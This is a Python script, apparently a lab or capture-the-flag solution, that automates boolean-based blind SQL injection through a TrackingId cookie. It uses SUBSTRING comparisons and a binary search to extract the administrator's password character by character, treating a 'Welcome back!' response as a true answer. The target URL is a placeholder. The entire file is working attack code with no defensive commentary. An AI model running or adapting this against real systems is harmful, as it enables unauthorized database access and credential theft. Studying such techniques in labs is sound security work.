import requests
payload = {'category': 'cvxvxv'}

password = []

def request(letter, index, sign):
    print(beg, end, letter)
    cookies = dict(TrackingId=f"9J1iKtBMYnQJBn4N' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {index}, 1) {sign} '{chr(letter)}")
    print(cookies)
    r = requests.get('sitegoeshere', params=payload, cookies=cookies)
    
    if 'Welcome back!' in r.text:
        print("yay")
        return True

def Checknumber(num, index, sign):
    cookies = dict(TrackingId=f"9J1iKtBMYnQJBn4N' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {index}, 1) {sign} '{num}")
    print(cookies)
    r = requests.get('sitegoeshere', params=payload, cookies=cookies)
    
    if 'Welcome back!' in r.text:
        print("yay")
        return True
index = 1
for i in range(0, 20):
    beg = 96
    end = 123
    if Checknumber('A', index, ">") != True:
        if Checknumber('a', index, "="):
            password.append("a")
            index += 1
            
            continue
        print("oh no")
        for y in range(0, 10):
            if Checknumber(str(y), index, "="):
                password.append(y)
                print("VERGA")
                print(password)
                index += 1
                break
        continue        
   
    while True:
        half = beg + abs(round((end - beg) / 2))
        if half == beg or half == end:
            index += 1
            print("wut")
            break 
        if request(half, index, "="):
            password.append(chr(half))
            
            print(password)
            index += 1
            break
        if request(half, index, "<"):
            end = half
            print("minus")
            continue
        if request(half, index, ">"):
            beg = half
            print("plus")
            continue   
        print("something's off'")

print(password)



   


